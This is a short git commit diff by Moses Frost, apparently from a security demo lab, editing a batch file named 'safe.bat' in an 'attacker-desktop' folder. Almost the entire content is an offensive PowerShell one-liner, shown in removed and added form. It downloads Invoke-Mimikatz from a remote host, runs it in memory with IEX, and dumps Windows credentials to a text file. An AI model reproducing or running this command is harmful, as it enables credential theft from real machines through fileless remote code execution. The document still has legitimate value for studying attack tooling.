827429b22ebbd90a25b9682128199ca61362805c
Moses Frost <moses@moses.io>
2018-05-21 16:50:04 -0400

    Upload initial files

--- LIVE/attacker-desktop/safe.bat
+++ LIVE/attacker-desktop/safe.bat
@@ -1,3 +1,3 @@
 @ECHO OFF
 mkdir C:\dcloud
-cmd /c powershell -nop -command “& {IEX ((new-object net.webclient).downloadstring(‘\\198.18.133.6:9000\Invoke-Mimikatz.ps1’));Invoke-Mimikatz -DumpCreds > C:\dcloud\safe.txt}”
+cmd /c %SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -nop -command “& {IEX ((new-object net.webclient).downloadstring(‘\\198.18.133.6:9000\Invoke-Mimikatz.ps1’));Invoke-Mimikatz -DumpCreds > C:\dcloud\safe.txt 2>&1”
